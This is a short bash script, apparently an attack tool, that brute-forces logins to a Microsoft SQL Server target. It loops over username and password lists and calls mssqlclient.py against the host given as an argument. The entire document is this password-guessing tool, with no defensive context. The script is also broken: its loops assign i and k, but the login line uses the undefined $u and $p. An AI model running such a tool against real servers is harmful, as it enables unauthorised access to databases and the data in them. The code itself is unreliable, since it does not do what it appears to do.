#!/bin/bash

if [ "$1" == "" ]
        then
                echo;echo "[>] Usage: $0 <target>";echo
        else
                for i in $(cat users.txt);do
                        for k in $(cat pass.txt);do
                                mssqlclient.py $u:$p@$1
                        done
                done
fi
